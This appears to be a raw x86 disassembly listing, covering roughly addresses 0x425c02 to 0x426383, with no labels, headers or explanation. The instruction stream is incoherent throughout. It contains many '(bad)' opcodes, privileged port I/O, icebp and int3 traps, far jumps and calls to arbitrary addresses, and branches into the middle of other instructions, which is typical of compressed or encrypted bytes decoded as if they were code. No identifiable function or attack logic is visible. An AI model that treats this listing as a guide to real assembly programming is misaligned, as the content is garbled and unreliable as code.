  425c02:	pop    esp
  425c03:	fst    DWORD PTR [eax-0xfa9aca]
  425c09:	xor    al,0x2d
  425c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c0c:	xor    al,0xe6
  425c0e:	aaa    
  425c0f:	xlat   BYTE PTR ds:[ebx]
  425c10:	and    DWORD PTR [esi-0x13],edi
  425c13:	into   
  425c14:	inc    ecx
  425c15:	push   esi
  425c16:	sub    edx,ebx
  425c18:	mov    DWORD PTR [ecx-0x49f4d46],ebx
  425c1e:	push   ebp
  425c1f:	mov    edx,0xd1158762
  425c24:	xchg   dl,dl
  425c26:	in     eax,0x3f
  425c28:	mov    bl,0xe2
  425c2a:	lock xlat BYTE PTR ds:[ebx]
  425c2c:	mov    esp,gs
  425c2e:	pusha  
  425c2f:	jno    0x425bdd
  425c31:	inc    ebx
  425c32:	out    dx,al
  425c33:	mov    dl,0xf8
  425c35:	jbe    0x425c41
  425c37:	xlat   BYTE PTR ds:[ebx]
  425c38:	or     eax,edi
  425c3a:	dec    esi
  425c3b:	sbb    eax,0x52743a83
  425c40:	mov    bl,bh
  425c42:	jmp    0x425c9f
  425c44:	test   BYTE PTR [edx+eiz*1+0x67],ah
  425c48:	cld    
  425c49:	add    eax,0x6e35e6c8
  425c4e:	rol    BYTE PTR [eax-0x549f3b83],1
  425c54:	scas   al,BYTE PTR es:[edi]
  425c55:	clc    
  425c56:	out    0x89,al
  425c58:	push   es
  425c59:	xchg   edx,eax
  425c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c5b:	shr    BYTE PTR [edx],1
  425c5d:	sbb    eax,DWORD PTR [ebx]
  425c5f:	and    dl,bl
  425c61:	(bad)  
  425c62:	fisttp WORD PTR [ebx-0x27]
  425c65:	jmp    0x2cb2a1d8
  425c6a:	adc    BYTE PTR [ebx],dh
  425c6c:	leave  
  425c6d:	mov    ds:0x34c4c37,eax
  425c72:	add    dh,BYTE PTR [edi-0x5fa0d47d]
  425c78:	popa   
  425c79:	mov    dh,0x60
  425c7b:	in     eax,dx
  425c7c:	icebp  
  425c7d:	or     eax,0x61b47f4c
  425c82:	paddq  mm1,mm3
  425c85:	jnp    0x425cc7
  425c87:	push   ebp
  425c88:	sbb    bh,ch
  425c8a:	loope  0x425c1f
  425c8c:	mov    DWORD PTR [ebp+0x17],eax
  425c8f:	add    bl,BYTE PTR [ecx+0x54]
  425c92:	jge    0x425c62
  425c94:	pop    edi
  425c95:	add    bl,BYTE PTR [eax+0x4ea1e65e]
  425c9b:	xchg   ecx,eax
  425c9c:	cmc    
  425c9d:	sub    al,0x1f
  425c9f:	shr    esp,0x4b
  425ca2:	mov    WORD PTR [eax-0x677d5f52],?
  425ca8:	test   ebp,ebp
  425caa:	xor    dl,bh
  425cac:	dec    edi
  425cad:	(bad)  
  425cae:	jmp    0x1ff2efc2
  425cb3:	ins    DWORD PTR es:[edi],dx
  425cb4:	pusha  
  425cb5:	sub    DWORD PTR [eax+0x3c8b8c33],ebp
  425cbb:	mov    eax,0x9e0f0ee3
  425cc0:	enter  0xa9a7,0x7a
  425cc4:	jne    0x425cea
  425cc6:	aas    
  425cc7:	loope  0x425d30
  425cc9:	repnz mov al,ds:0x1e27e1ba
  425ccf:	xor    DWORD PTR [ebp-0x33],0x54
  425cd3:	sub    ch,dh
  425cd5:	xchg   esp,eax
  425cd6:	pushf  
  425cd7:	aad    0x87
  425cd9:	pusha  
  425cda:	mov    ss,WORD PTR [ecx-0xe]
  425cdd:	sub    ebp,esi
  425cdf:	inc    eax
  425ce0:	(bad)  
  425ce1:	pop    ecx
  425ce2:	cmp    DWORD PTR [ecx],edi
  425ce4:	out    0x23,eax
  425ce6:	es mov ah,0xd2
  425ce9:	mov    ds:0x6206d623,al
  425cee:	sbb    DWORD PTR [edi+0x78],edx
  425cf1:	stos   BYTE PTR es:[edi],al
  425cf2:	dec    ebp
  425cf3:	in     eax,dx
  425cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cf5:	push   ecx
  425cf6:	push   ds
  425cf7:	dec    ebx
  425cf8:	pop    ebx
  425cf9:	int3   
  425cfa:	pop    ecx
  425cfb:	outs   dx,DWORD PTR ds:[esi]
  425cfc:	mov    eax,0xf4d58322
  425d01:	arpl   WORD PTR [edi+0x7e975fc1],bp
  425d07:	pop    ss
  425d08:	jns    0x425d74
  425d0a:	push   ds
  425d0b:	addr16 cs inc ecx
  425d0e:	pop    ebp
  425d0f:	add    al,ah
  425d11:	std    
  425d12:	pop    es
  425d13:	xlat   BYTE PTR ds:[ebx]
  425d14:	adc    BYTE PTR [ecx+0x3e983631],ah
  425d1a:	test   BYTE PTR [edi+0x47e7df9a],dl
  425d20:	push   esi
  425d21:	add    esi,DWORD PTR [ebx-0x10189957]
  425d27:	mov    ecx,0xf1dfeeba
  425d2c:	or     al,BYTE PTR [eax-0x6d655100]
  425d32:	xor    al,cl
  425d34:	mov    ebx,esi
  425d36:	stc    
  425d37:	or     al,0xdc
  425d39:	stos   BYTE PTR es:[edi],al
  425d3a:	rol    BYTE PTR [ebp+0x14],1
  425d3d:	out    dx,al
  425d3e:	jo     0x425cde
  425d40:	bound  esp,QWORD PTR [ecx-0x49d9abc4]
  425d46:	fisttp DWORD PTR [ebp+0x700c889d]
  425d4c:	mov    DWORD PTR [ebx+0x4d],esp
  425d4f:	ss out 0x15,eax
  425d52:	jb     0x425d67
  425d54:	test   DWORD PTR ds:0xfd40b02c,eax
  425d5a:	(bad)  
  425d5b:	jg     0x425ce5
  425d5d:	xchg   esp,eax
  425d5e:	pop    esp
  425d5f:	jge    0x425d7e
  425d61:	pop    eax
  425d62:	adc    ebx,DWORD PTR [edi+ebx*1-0x226e12f4]
  425d69:	lods   al,BYTE PTR ds:[esi]
  425d6a:	mov    al,ds:0x1ad23e1f
  425d6f:	aam    0x4c
  425d71:	cmc    
  425d72:	mov    cl,0x3f
  425d74:	mov    eax,0x836dcbca
  425d79:	add    ebp,DWORD PTR [ebx+ebx*2+0x631e2bb6]
  425d80:	cwde   
  425d81:	or     DWORD PTR [edx],ebx
  425d83:	fs jns 0x425d89
  425d86:	push   0xb27ff9e0
  425d8b:	or     eax,0x51f3852
  425d90:	ins    BYTE PTR es:[edi],dx
  425d91:	leave  
  425d92:	sub    al,0x56
  425d94:	out    0x7,eax
  425d96:	fs int 0x9f
  425d99:	add    dl,BYTE PTR [eax+0x79]
  425d9c:	dec    ebp
  425d9d:	jge    0x425dbb
  425d9f:	mov    es,edi
  425da1:	out    dx,eax
  425da2:	gs jno 0x425d77
  425da5:	inc    edi
  425da6:	jmp    0x7007:0xb292eb90
  425dad:	add    edx,DWORD PTR [edx+edx*1+0x54]
  425db1:	sub    al,0x31
  425db3:	jnp    0x425d63
  425db5:	aad    0x5a
  425db7:	mov    ebx,0xc09fcb3a
  425dbc:	push   0x22
  425dbe:	rcr    DWORD PTR [ecx],cl
  425dc0:	add    DWORD PTR ds:0x509b89ce,0xac8ef3ed
  425dca:	pop    ds
  425dcb:	imul   ecx,DWORD PTR [ebx],0x6c
  425dce:	in     eax,0x30
  425dd0:	mov    eax,ds:0xe7cda0b7
  425dd5:	add    bl,BYTE PTR [edx-0x4d]
  425dd8:	sbb    BYTE PTR [ebx-0x12fac41d],bl
  425dde:	bound  eax,QWORD PTR [ebp-0x21]
  425de1:	aas    
  425de2:	sahf   
  425de3:	pop    esi
  425de4:	xlat   BYTE PTR ds:[ebx]
  425de5:	fsubr  st(0),st
  425de7:	lods   al,BYTE PTR ds:[esi]
  425de8:	pop    ds
  425de9:	add    ah,BYTE PTR [edx]
  425deb:	and    eax,0x6043f625
  425df0:	dec    ecx
  425df1:	xchg   ecx,eax
  425df2:	cmp    BYTE PTR [eax+0x50253b89],0x20
  425df9:	push   ebx
  425dfa:	jp     0x425de5
  425dfc:	pop    ds
  425dfd:	sbb    eax,0x76a0a4e
  425e02:	cmc    
  425e03:	jno    0x425dad
  425e05:	fs pop esi
  425e07:	hlt    
  425e08:	mov    ss,edi
  425e0a:	push   ebp
  425e0b:	das    
  425e0c:	adc    BYTE PTR [ebx],ch
  425e0e:	xor    esp,DWORD PTR [edi]
  425e10:	push   cs
  425e11:	into   
  425e12:	fcmovnbe st,st(5)
  425e14:	int3   
  425e15:	mov    ?,WORD PTR [edx-0x4bf8559]
  425e1b:	adc    ch,BYTE PTR [edx+0x34]
  425e1e:	or     esp,ebx
  425e20:	mov    DWORD PTR [edi-0x69188365],edx
  425e26:	aaa    
  425e27:	cmp    DWORD PTR [eax+0x1c],edi
  425e2a:	aam    0x30
  425e2c:	jnp    0x425e40
  425e2e:	jne    0x425e53
  425e30:	or     bl,dh
  425e32:	in     al,0x60
  425e34:	mov    ebp,DWORD PTR [ecx-0x65467c25]
  425e3a:	xor    bl,BYTE PTR [esi]
  425e3c:	sbb    BYTE PTR [ebx+0x73],dh
  425e3f:	aad    0x78
  425e41:	fiadd  WORD PTR [ebx+0x40]
  425e44:	pop    eax
  425e45:	sbb    al,0xec
  425e47:	jb     0x425dd2
  425e49:	sub    eax,0xe080d70c
  425e4e:	jns    0x425dfd
  425e50:	into   
  425e51:	add    bl,dh
  425e53:	cmp    ecx,DWORD PTR [ebp+0x6d1d8333]
  425e59:	pop    ss
  425e5a:	gs icebp 
  425e5c:	mov    eax,ds:0xfc5cb094
  425e61:	jne    0x425e70
  425e63:	pop    edi
  425e64:	add    al,0xe3
  425e66:	adc    BYTE PTR [eax-0x28d6ed16],cl
  425e6c:	in     eax,0x68
  425e6e:	cld    
  425e6f:	jl     0x425ec2
  425e71:	cld    
  425e72:	pop    ds
  425e73:	int    0x72
  425e75:	pop    edx
  425e76:	and    eax,0x32b3126d
  425e7b:	sti    
  425e7c:	es sbb eax,0x9c142908
  425e82:	pop    edx
  425e83:	inc    esi
  425e84:	js     0x425e71
  425e86:	cmp    esi,DWORD PTR [esi]
  425e88:	mov    BYTE PTR [ebx],ch
  425e8a:	mov    ds:0x2e9604b9,al
  425e8f:	ins    DWORD PTR es:[edi],dx
  425e90:	push   esi
  425e91:	and    al,0x90
  425e93:	stc    
  425e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e95:	popa   
  425e96:	mov    al,ds:0x38a0003f
  425e9b:	push   edi
  425e9c:	pop    eax
  425e9d:	clc    
  425e9e:	popa   
  425e9f:	pop    ecx
  425ea0:	pop    ebp
  425ea1:	retf   0x3300
  425ea4:	sbb    ch,BYTE PTR [eax+0xe]
  425ea7:	sub    ecx,DWORD PTR [esi+0x48]
  425eaa:	sub    cl,BYTE PTR [ecx+0xc0a1d59]
  425eb0:	adc    al,0x17
  425eb2:	jle    0x425ea2
  425eb4:	sti    
  425eb5:	or     esp,DWORD PTR [eax+0x41]
  425eb8:	out    dx,al
  425eb9:	fcmovbe st,st(1)
  425ebb:	mov    DWORD PTR [eax+esi*8],esp
  425ebe:	or     DWORD PTR [edx+0x637a412c],ecx
  425ec4:	mov    DWORD PTR [ebp-0xaf773a2],edx
  425eca:	inc    ebp
  425ecb:	mov    eax,0x639db2c8
  425ed0:	pop    es
  425ed1:	clc    
  425ed2:	stc    
  425ed3:	stos   DWORD PTR es:[edi],eax
  425ed4:	fldenv [ebp-0x3c]
  425ed7:	lds    esi,FWORD PTR [edx]
  425ed9:	test   eax,0x757f8560
  425ede:	mov    dh,0x61
  425ee0:	pushf  
  425ee1:	mov    eax,ds:0xedead48a
  425ee6:	xor    BYTE PTR ds:0xbeeee36c,0x8c
  425eed:	dec    ecx
  425eee:	inc    ebp
  425eef:	leave  
  425ef0:	test   BYTE PTR [eax],dh
  425ef2:	push   edx
  425ef3:	push   ebp
  425ef4:	push   0x63d43ffc
  425ef9:	lea    edx,[edx-0x1f1589bb]
  425eff:	push   ss
  425f00:	pop    ebp
  425f02:	mov    ebp,0x53758026
  425f07:	mov    DWORD PTR [eax],0x2f34ec56
  425f0d:	pushf  
  425f0e:	pop    es
  425f0f:	xor    al,0xa4
  425f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f12:	pushf  
  425f13:	aad    0x3
  425f15:	sub    al,BYTE PTR [esi+eax*4-0x24bfb65d]
  425f1c:	mov    bh,dh
  425f1e:	mov    ch,0xad
  425f20:	ficom  WORD PTR [ecx+edi*8-0x6a]
  425f24:	sbb    al,0x2
  425f26:	enter  0x15c2,0x2a
  425f2a:	scas   eax,DWORD PTR es:[edi]
  425f2b:	inc    esi
  425f2c:	xor    bl,BYTE PTR ds:[esi]
  425f2f:	in     eax,0x9d
  425f31:	sbb    DWORD PTR [esi+0x53],esp
  425f34:	xchg   esp,eax
  425f35:	or     BYTE PTR [esp+edx*8-0xabb46cb],ah
  425f3c:	sbb    DWORD PTR [edx+0x47a65c75],0xb58bd007
  425f46:	or     al,0xe2
  425f48:	retf   0xfa8
  425f4b:	add    edx,DWORD PTR [edx]
  425f4d:	adc    DWORD PTR [edx+0x70],esi
  425f50:	(bad)  
  425f52:	pop    ds
  425f53:	cs jne 0x425f2e
  425f56:	xchg   esi,ebx
  425f58:	mov    BYTE PTR [edi-0x7d],dl
  425f5b:	out    0x8f,eax
  425f5d:	stc    
  425f5e:	dec    ecx
  425f5f:	xchg   esi,eax
  425f60:	mov    al,BYTE PTR ds:0x7903be74
  425f66:	jle    0x425fe7
  425f68:	xchg   ch,bh
  425f6a:	jb     0x425f51
  425f6c:	and    ecx,ebp
  425f6e:	pop    ecx
  425f6f:	aam    0x36
  425f71:	and    eax,0x32b853f
  425f76:	push   ss
  425f77:	mov    cl,0x9a
  425f79:	and    eax,0xa1f9251
  425f7e:	pop    ds
  425f7f:	and    DWORD PTR [ebx],eax
  425f81:	xor    ch,BYTE PTR [edx+0x3a]
  425f84:	and    BYTE PTR [ebp-0x3cc52a80],0x39
  425f8b:	xchg   ecx,eax
  425f8c:	add    eax,0x8916b683
  425f91:	scas   eax,DWORD PTR es:[edi]
  425f92:	inc    esi
  425f93:	arpl   WORD PTR [ecx],di
  425f95:	ja     0x425fa7
  425f97:	sub    edx,DWORD PTR [edx]
  425f99:	div    DWORD PTR [ecx-0x2c]
  425f9c:	into   
  425f9d:	pop    ebx
  425f9e:	inc    edx
  425f9f:	ins    BYTE PTR es:[edi],dx
  425fa0:	test   DWORD PTR [eax+0x41f27c63],esi
  425fa6:	mov    edi,0xe44e1cd5
  425fab:	or     al,0xa6
  425fad:	imul   DWORD PTR [edx]
  425faf:	xlat   BYTE PTR ds:[ebx]
  425fb0:	mov    ecx,DWORD PTR ds:0x2eb2a282
  425fb6:	cmp    BYTE PTR [eax+0x5de3cfe8],ch
  425fbc:	in     al,0xa7
  425fbe:	mov    ds:0x32745d4,eax
  425fc3:	fsub   st,st(6)
  425fc5:	sbb    BYTE PTR [eax+ebx*4-0x77],0xb5
  425fca:	(bad)  
  425fcb:	mov    esi,0x6bc454ca
  425fd0:	jecxz  0x425fd2
  425fd2:	stos   BYTE PTR es:[edi],al
  425fd3:	cmp    eax,edi
  425fd5:	push   es
  425fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fd7:	mov    bh,0x54
  425fd9:	ret    
  425fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fdb:	xchg   ecx,eax
  425fdc:	mov    BYTE PTR [ebx+0x71],cl
  425fdf:	ins    BYTE PTR es:[edi],dx
  425fe0:	popa   
  425fe1:	cdq    
  425fe2:	call   0x337f:0x160263da
  425fe9:	mov    ch,0x7a
  425feb:	scas   al,BYTE PTR es:[edi]
  425fec:	sbb    al,0xb3
  425fee:	lods   al,BYTE PTR ds:[esi]
  425fef:	(bad)  
  425ff1:	(bad)  
  425ff2:	pusha  
  425ff3:	test   eax,0xf886bbe5
  425ff8:	cmc    
  425ff9:	add    bl,BYTE PTR [esi+0x6d53fee6]
  425fff:	icebp  
  426000:	adc    WORD PTR [esi],bx
  426003:	lds    eax,FWORD PTR [eax+0x5069de37]
  426009:	into   
  42600a:	rcl    ch,0x4a
  42600d:	adc    al,0xf
  42600f:	xor    BYTE PTR [esi-0x2a],al
  426012:	je     0x425fef
  426014:	mov    cl,dh
  426016:	mov    DWORD PTR [esi-0x2150b1bf],edi
  42601c:	shl    cl,cl
  42601e:	sub    al,0xd6
  426020:	push   0x77a37e8d
  426025:	into   
  426026:	std    
  426027:	cmc    
  426028:	push   edi
  426029:	cmp    BYTE PTR [ebp-0x1b],ah
  42602c:	imul   esi,esp,0x82d45b55
  426032:	test   BYTE PTR [eax],cl
  426034:	cmp    BYTE PTR [edx],al
  426036:	in     al,dx
  426037:	(bad)  
  426039:	xor    bh,cl
  42603b:	sbb    al,0xf5
  42603d:	and    BYTE PTR [edi],bl
  42603f:	fldcw  WORD PTR [eax*8+0x61de758e]
  426046:	mov    ebp,DWORD PTR [edx-0x3c3564fb]
  42604c:	cmp    al,bl
  42604e:	add    ebp,DWORD PTR [edx]
  426050:	sbb    bl,al
  426052:	pop    ds
  426053:	fld    TBYTE PTR [edi]
  426055:	pop    ds
  426056:	popf   
  426057:	jbe    0x42603b
  426059:	(bad)  
  42605a:	mov    BYTE PTR [ebx-0x4f3cdff5],ch
  426060:	fisub  WORD PTR [eax-0x223b5dc2]
  426066:	fdiv   DWORD PTR [eax+0x5c38b8a]
  42606c:	rol    BYTE PTR [eax*1-0x5701f6fe],1
  426073:	leave  
  426074:	pusha  
  426075:	sbb    al,0x28
  426077:	aas    
  426078:	pop    eax
  426079:	cmp    al,0x50
  42607b:	jb     0x4260d6
  42607d:	inc    ecx
  42607e:	or     BYTE PTR [eax+0x523a1588],cl
  426084:	jbe    0x4260e5
  426086:	pop    ecx
  426087:	hlt    
  426088:	adc    al,bl
  42608a:	and    al,0xd7
  42608c:	icebp  
  42608d:	mov    bl,0xa9
  42608f:	jne    0x42604a
  426091:	(bad)  
  426092:	adc    ecx,edi
  426094:	fwait
  426095:	jae    0x4260c9
  426097:	mov    edi,0x77070592
  42609c:	mov    dh,BYTE PTR [ecx]
  42609e:	daa    
  42609f:	rcl    BYTE PTR [ebx],cl
  4260a1:	mov    ecx,0xe5119b5e
  4260a6:	add    BYTE PTR [ecx],ch
  4260a8:	jg     0x426086
  4260aa:	pusha  
  4260ab:	idiv   DWORD PTR [esi]
  4260ad:	inc    edx
  4260ae:	and    ch,0xf6
  4260b1:	int    0xd4
  4260b3:	aad    0x86
  4260b5:	outs   dx,DWORD PTR ds:[esi]
  4260b6:	push   edx
  4260b7:	or     ch,dh
  4260b9:	jmp    0xb7ce4b56
  4260be:	jnp    0x426066
  4260c0:	sub    edx,DWORD PTR [ecx+0x9502fcb]
  4260c6:	fst    st(4)
  4260c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260c9:	bound  ebx,QWORD PTR [edi-0x52]
  4260cc:	stos   BYTE PTR es:[edi],al
  4260cd:	cld    
  4260ce:	inc    edi
  4260cf:	fist   WORD PTR [edi+esi*4+0x37b8d79e]
  4260d6:	push   ds
  4260d7:	mov    DWORD PTR [ecx+edi*1+0x21],edi
  4260db:	sbb    BYTE PTR [edx+ebp*2+0x74],ah
  4260df:	lds    ebx,FWORD PTR [ebp+eax*1+0x7da88d10]
  4260e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260e7:	xchg   ecx,eax
  4260e8:	mov    BYTE PTR ds:0x9ea8b8ca,cl
  4260ee:	push   ebx
  4260ef:	cmp    dh,BYTE PTR [edx+0xa]
  4260f2:	push   0x4ae8c79f
  4260f7:	aad    0xfa
  4260f9:	repnz outs dx,DWORD PTR ds:[esi]
  4260fb:	sub    BYTE PTR [edi],bh
  4260fd:	jg     0x42617b
  4260ff:	shld   esp,eax,cl
  426102:	mov    esp,0xf7f61c94
  426107:	push   0xd45ce67a
  42610c:	or     ebx,DWORD PTR [esi+0x45edd678]
  426112:	out    0x6a,eax
  426114:	mov    BYTE PTR [edi],al
  426116:	sub    eax,0x814859ad
  42611b:	push   cs
  42611c:	sti    
  42611d:	add    eax,0x14660204
  426122:	inc    eax
  426123:	push   ecx
  426124:	retf   0x1fe0
  426127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426128:	pop    ds
  426129:	outs   dx,DWORD PTR ds:[esi]
  42612a:	mov    BYTE PTR [esp+eax*8],bl
  42612d:	(bad)  
  42612e:	dec    esi
  42612f:	aam    0x8c
  426131:	mov    dl,0x88
  426133:	stc    
  426134:	icebp  
  426135:	lea    esp,[eax-0x6e]
  426138:	mov    cl,0xf3
  42613a:	jg     0x426186
  42613c:	or     BYTE PTR [eax],al
  42613e:	sbb    al,BYTE PTR [esi-0x28ee5ace]
  426144:	push   ebx
  426145:	aaa    
  426146:	push   edx
  426147:	add    bh,al
  426149:	int    0xa8
  42614b:	jecxz  0x42614c
  42614d:	and    DWORD PTR [ebx+0x7484c9d3],edi
  426153:	rcr    dl,cl
  426155:	ret    0x7582
  426158:	xchg   DWORD PTR ds:0x67bc2b4e,eax
  42615e:	out    0x87,al
  426160:	call   0x3c09a6fa
  426165:	push   es
  426166:	pop    ds
  426167:	cdq    
  426168:	iret   
  426169:	int3   
  42616a:	cdq    
  42616b:	jmp    0xd4b9e917
  426170:	xchg   bh,dl
  426172:	bound  eax,QWORD PTR ds:0x7311a240
  426178:	pop    ebx
  426179:	cmp    BYTE PTR [esi],bl
  42617b:	popf   
  42617c:	stos   BYTE PTR es:[edi],al
  42617d:	loop   0x426180
  42617f:	push   ds
  426180:	data16 jge 0x4261d2
  426183:	aam    0x50
  426185:	imul   ebp,esp,0xdcb45328
  42618b:	aaa    
  42618c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42618d:	xchg   ecx,eax
  42618e:	pop    ecx
  42618f:	push   0xffffff89
  426191:	aas    
  426192:	add    esp,DWORD PTR [ecx+0x74]
  426195:	add    al,0xdc
  426197:	aam    0x36
  426199:	dec    eax
  42619a:	mov    ss,WORD PTR [ebp+0x6364ec10]
  4261a0:	clc    
  4261a1:	push   esi
  4261a2:	push   ds
  4261a3:	aaa    
  4261a4:	xchg   esi,eax
  4261a5:	repz mov ah,0xd
  4261a8:	inc    edx
  4261a9:	fidivr DWORD PTR [ebp-0x3c113e56]
  4261af:	mov    bh,0xe2
  4261b1:	fwait
  4261b2:	xchg   ecx,eax
  4261b3:	push   esp
  4261b4:	sbb    al,0xab
  4261b6:	xchg   ebx,eax
  4261b7:	xchg   edx,eax
  4261b8:	mov    BYTE PTR [edi+0x77b9f6eb],cl
  4261be:	stos   BYTE PTR es:[edi],al
  4261bf:	jmp    0x4261e8
  4261c1:	add    ebx,DWORD PTR [eax-0x37991e5e]
  4261c7:	jp     0x4261e4
  4261c9:	dec    edi
  4261ca:	jl     0x4261d5
  4261cc:	retf   
  4261cd:	pop    eax
  4261ce:	mov    ah,0x15
  4261d0:	fwait
  4261d1:	leave  
  4261d2:	nop
  4261d3:	adc    esp,DWORD PTR [ebp-0x50d679d6]
  4261d9:	xchg   esp,eax
  4261da:	inc    eax
  4261db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261dc:	mov    edi,DWORD PTR [ecx+0x6c]
  4261df:	ins    BYTE PTR es:[edi],dx
  4261e0:	adc    ch,BYTE PTR [edx-0x4a878ae6]
  4261e6:	pop    esp
  4261e7:	(bad)  
  4261e8:	sbb    ah,BYTE PTR ds:0xdd650e06
  4261ee:	outs   dx,BYTE PTR ds:[esi]
  4261ef:	jne    0x4261bb
  4261f1:	(bad)  
  4261f2:	jl     0x4261e1
  4261f4:	mov    es,WORD PTR [eax+eiz*8]
  4261f7:	adc    eax,0xa09a97dd
  4261fc:	add    ebx,DWORD PTR cs:[esi-0x20492716]
  426203:	nop
  426204:	pop    ss
  426205:	ja     0x426226
  426207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426209:	in     eax,0x7
  42620b:	and    DWORD PTR [esi+0xcd544e4],ebx
  426211:	lods   al,BYTE PTR ds:[esi]
  426212:	aaa    
  426213:	sub    eax,DWORD PTR [esp+eax*2-0x2d]
  426217:	cmp    DWORD PTR [eax+0x407ff98f],ecx
  42621d:	es inc edi
  42621f:	fsqrt  
  426221:	add    bh,BYTE PTR [edx-0x8e810f3]
  426227:	arpl   WORD PTR [eax+0x3a8f611a],si
  42622d:	xlat   BYTE PTR ds:[ebx]
  42622e:	xor    ebp,DWORD PTR [eax+0x6ae11d4e]
  426234:	pop    eax
  426235:	popf   
  426236:	and    ebp,ebx
  426238:	push   0x9ed73c81
  42623d:	dec    esi
  42623e:	out    0xf1,eax
  426240:	mov    ah,BYTE PTR [edx-0x2d]
  426243:	jl     0x4261ce
  426245:	or     edx,DWORD PTR [ebx]
  426247:	push   cs
  426248:	jns    0x4261db
  42624a:	icebp  
  42624b:	ins    BYTE PTR es:[edi],dx
  42624c:	add    eax,0x5e59ca03
  426251:	fistp  QWORD PTR [esi+0x1f]
  426254:	(bad)  
  426255:	lods   al,BYTE PTR ds:[esi]
  426256:	pop    ds
  426257:	push   ebp
  426258:	popa   
  426259:	cmp    eax,0x88bcd088
  42625e:	jnp    0x426237
  426260:	mov    bl,0x4c
  426262:	jbe    0x4261e6
  426264:	jbe    0x4262e3
  426266:	pop    ebx
  426267:	adc    eax,0x8b1e5c62
  42626c:	mov    ebp,cs
  42626e:	int3   
  42626f:	pop    ecx
  426270:	in     al,0x84
  426272:	test   eax,0xb29dbba
  426277:	and    BYTE PTR [eax],cl
  426279:	add    al,bl
  42627b:	adc    eax,0xa957e4bd
  426280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426281:	stos   BYTE PTR es:[edi],al
  426282:	lahf   
  426283:	cmp    ebp,DWORD PTR [ebp+0x52ff2c94]
  426289:	add    dl,BYTE PTR [esi]
  42628b:	sti    
  42628c:	inc    ebx
  42628d:	fild   QWORD PTR [ebp+0x5b]
  426290:	scas   eax,DWORD PTR es:[edi]
  426291:	arpl   WORD PTR [esi-0x73fc805b],cx
  426297:	xor    eax,0x1756da5f
  42629c:	into   
  42629d:	jmp    0xcb093782
  4262a2:	imul   eax,DWORD PTR [ecx],0xb5dcd299
  4262a8:	mov    ecx,esi
  4262aa:	aad    0x29
  4262ac:	inc    ecx
  4262ad:	mov    esi,0x5aec9f9
  4262b2:	cwde   
  4262b3:	(bad)  
  4262b4:	sbb    eax,0x8578348b
  4262b9:	loop   0x4262da
  4262bb:	xlat   BYTE PTR ds:[ebx]
  4262bc:	fist   DWORD PTR [edx+0x9]
  4262bf:	fisttp DWORD PTR [esi-0x5d2c0d32]
  4262c5:	int    0xc1
  4262c7:	pop    es
  4262c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262c9:	dec    ecx
  4262ca:	into   
  4262cb:	pushf  
  4262cc:	jg     0x426278
  4262ce:	pop    ds
  4262cf:	dec    ebp
  4262d0:	xchg   edx,eax
  4262d1:	das    
  4262d2:	inc    ecx
  4262d3:	gs cld 
  4262d5:	dec    eax
  4262d6:	jmp    0x4262ee
  4262d8:	enter  0x2c9d,0xd4
  4262dc:	or     eax,DWORD PTR [eax]
  4262de:	lock inc edx
  4262e0:	shr    DWORD PTR [ecx],cl
  4262e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262e3:	ins    BYTE PTR es:[edi],dx
  4262e4:	mov    DWORD PTR [edi-0x2f],edi
  4262e7:	sbb    edx,DWORD PTR [eax]
  4262e9:	mov    cl,0xfe
  4262eb:	lds    esp,FWORD PTR [edi]
  4262ed:	add    ebx,eax
  4262ef:	mov    DWORD PTR [ebp-0x1f1fbdc7],esi
  4262f5:	dec    ecx
  4262f6:	jno    0x42628b
  4262f8:	popa   
  4262f9:	ins    DWORD PTR es:[edi],dx
  4262fa:	xchg   ecx,eax
  4262fb:	aam    0x61
  4262fd:	clc    
  4262fe:	mov    edx,0xd80211fb
  426303:	iret   
  426304:	xor    eax,0x74ef8583
  426309:	rep outs dx,BYTE PTR ds:[esi]
  42630b:	rcr    DWORD PTR [esi+0x53],cl
  42630e:	xor    DWORD PTR [ecx-0x3a],edx
  426311:	cmp    edi,DWORD PTR [edi-0x4171b73a]
  426317:	aad    0x2
  426319:	fadd   QWORD PTR [edx-0x41329c60]
  42631f:	(bad)  
  426320:	mov    DWORD PTR [ebp+0x4d195fb8],edi
  426326:	retf   0x859e
  426329:	jae    0x426317
  42632b:	fisttp WORD PTR [eax+0x45747751]
  426331:	pop    ebp
  426332:	das    
  426333:	inc    ebp
  426334:	ins    DWORD PTR es:[edi],dx
  426335:	fwait
  426336:	mov    ds:0x6cfab23b,ax
  42633c:	ret    
  42633d:	jle    0x42634c
  42633f:	(bad)  [eax]
  426341:	ja     0x42638e
  426343:	js     0x4262ce
  426345:	femms  
  426347:	jb     0x426371
  426349:	sbb    eax,0x25b3bad
  42634e:	(bad)  
  42634f:	arpl   WORD PTR [eax+0x25550ab3],dx
  426355:	mov    eax,0x3f89db23
  42635a:	sub    al,0xb2
  42635c:	jo     0x426360
  42635e:	leave  
  42635f:	sahf   
  426360:	stos   DWORD PTR es:[edi],eax
  426361:	add    eax,0x3e8bbfb2
  426366:	test   al,al
  426368:	push   DWORD PTR [edx+0x18]
  42636b:	clc    
  42636c:	xchg   DWORD PTR [ebx-0x7d],edi
  42636f:	dec    edx
  426370:	cmc    
  426371:	dec    ebp
  426372:	push   ds
  426373:	ds lock loop 0x4263a1
  426377:	xlat   BYTE PTR ds:[ebx]
  426378:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42637a:	xchg   esp,eax
  42637b:	jge    0x426320
  42637d:	or     DWORD PTR [eax+0x32f18893],ebx
  426383:	jmp    0x426391
